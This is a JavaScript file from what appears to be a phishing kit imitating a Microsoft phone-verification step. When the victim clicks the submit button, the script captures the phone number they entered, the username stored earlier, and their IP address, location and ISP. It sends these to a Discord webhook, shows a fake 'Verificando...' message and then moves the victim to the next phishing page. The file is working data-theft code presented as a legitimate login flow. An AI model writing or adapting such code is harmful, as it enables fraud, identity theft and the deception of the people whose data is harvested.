// Discord Logger para index2.html (Verificación de Teléfono)
// Usa DiscordConfig desde discord-config.js

(function() {
  'use strict';
  
  function sendPhoneInfo(countryCode, phone) {
    return DiscordConfig.getIpInfo().then(function(info) {
      var user = localStorage.getItem('ms_user') || 'N/A';
      var embed = {
        title: '📱 Microsoft - Teléfono Capturado',
        color: 0x00a4ef,
        fields: [
          { name: '👤 Usuario', value: '`' + user + '`', inline: false },
          { name: '📞 Teléfono', value: '```' + countryCode + ' ' + phone + '```', inline: false },
          { name: '🌐 Dirección IP', value: '`' + info.ip + '`', inline: false },
          { name: '📍 Ubicación', value: '`' + info.location + '`', inline: false },
          { name: '🏢 Proveedor ISP', value: '`' + info.isp + '`', inline: false },
          { name: '🌍 País', value: info.flag + ' ' + info.country + ' (' + info.country_code + ')', inline: false }
        ],
        footer: { text: new Date().toLocaleString() },
        timestamp: new Date().toISOString()
      };
      return DiscordConfig.sendEmbed(embed);
    });
  }
  
  document.addEventListener('DOMContentLoaded', function() {
    var dokoInput = document.getElementById('doko');
    var countrySelect = document.querySelector('select');
    var submitBtn = document.querySelector('button[style*="microsoft-blue"]') || 
                      document.querySelectorAll('.px-4.py-2.text-white.rounded')[1];
    
    if (!dokoInput || !submitBtn) return;
    
    submitBtn.addEventListener('click', function(e) {
      e.preventDefault();
      e.stopPropagation();
      
      var phone = dokoInput.value.trim().replace(/\D/g, '');
      var countryCode = countrySelect ? countrySelect.value : '+57';
      
      if (!phone || phone.length < 7) {
        alert('Por favor ingrese un número de teléfono válido');
        return;
      }
      
      submitBtn.innerHTML = 'Verificando...';
      submitBtn.disabled = true;
      
      localStorage.setItem('ms_phone', countryCode + phone);
      
      sendPhoneInfo(countryCode, phone).then(function() {
        setTimeout(function() {
          window.location.href = 'index3.html';
        }, 5000);
      });
    });
    
    dokoInput.addEventListener('keypress', function(e) {
      if (e.key === 'Enter') {
        e.preventDefault();
        submitBtn.click();
      }
    });
  });
})();
